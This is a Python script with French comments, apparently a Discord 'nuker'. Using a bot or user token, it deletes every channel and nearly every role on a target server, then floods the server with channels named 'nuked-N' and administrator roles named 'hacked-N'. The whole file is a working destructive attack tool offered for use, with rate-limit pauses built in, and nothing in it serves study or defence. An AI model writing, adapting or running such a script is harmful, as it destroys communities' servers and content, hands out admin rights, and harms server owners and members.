import requests
import time
import random
import json

# Configuration
TOKEN = "TON_TOKEN_DISCORD"  # Remplace par ton token (bot ou user)
SERVER_ID = "ID_DU_SERVEUR"  # Remplace par l'ID du serveur cible
HEADERS = {
    "Authorization": TOKEN,
    "Content-Type": "application/json"
}

# Fonction pour supprimer un salon
def delete_channel(channel_id):
    url = f"https://discord.com/api/v9/channels/{channel_id}"
    response = requests.delete(url, headers=HEADERS)
    if response.status_code == 200:
        print(f"[+] Salon supprimé : {channel_id}")
    else:
        print(f"[-] Échec suppression salon {channel_id} : {response.text}")

# Fonction pour supprimer un rôle
def delete_role(role_id):
    url = f"https://discord.com/api/v9/guilds/{SERVER_ID}/roles/{role_id}"
    response = requests.delete(url, headers=HEADERS)
    if response.status_code == 204:
        print(f"[+] Rôle supprimé : {role_id}")
    else:
        print(f"[-] Échec suppression rôle {role_id} : {response.text}")

# Fonction pour créer un salon
def create_channel(name):
    url = f"https://discord.com/api/v9/guilds/{SERVER_ID}/channels"
    data = {
        "name": name,
        "type": 0  # 0 = salon textuel, 2 = vocal
    }
    response = requests.post(url, headers=HEADERS, data=json.dumps(data))
    if response.status_code == 201:
        print(f"[+] Salon créé : {name}")
    else:
        print(f"[-] Échec création salon {name} : {response.text}")

# Fonction pour créer un rôle
def create_role(name):
    url = f"https://discord.com/api/v9/guilds/{SERVER_ID}/roles"
    data = {
        "name": name,
        "permissions": 8,  # Permissions admin (à ajuster)
        "color": random.randint(0, 0xFFFFFF)
    }
    response = requests.post(url, headers=HEADERS, data=json.dumps(data))
    if response.status_code == 200:
        print(f"[+] Rôle créé : {name}")
    else:
        print(f"[-] Échec création rôle {name} : {response.text}")

# Récupération des salons et rôles
def get_channels():
    url = f"https://discord.com/api/v9/guilds/{SERVER_ID}/channels"
    response = requests.get(url, headers=HEADERS)
    return response.json()

def get_roles():
    url = f"https://discord.com/api/v9/guilds/{SERVER_ID}/roles"
    response = requests.get(url, headers=HEADERS)
    return response.json()

# Exécution
if __name__ == "__main__":
    print("[*] Récupération des salons...")
    channels = get_channels()
    for channel in channels:
        delete_channel(channel["id"])
        time.sleep(1)  # Évite les rate limits

    print("[*] Récupération des rôles...")
    roles = get_roles()
    for role in roles:
        if role["name"] != "@everyone":  # Ne pas supprimer le rôle @everyone
            delete_role(role["id"])
            time.sleep(1)

    print("[*] Création de salons...")
    for i in range(10):  # Crée 10 salons
        create_channel(f"nuked-{i}")
        time.sleep(1)

    print("[*] Création de rôles...")
    for i in range(5):  # Crée 5 rôles
        create_role(f"hacked-{i}")
        time.sleep(1)

    print("[*] Opération terminée.")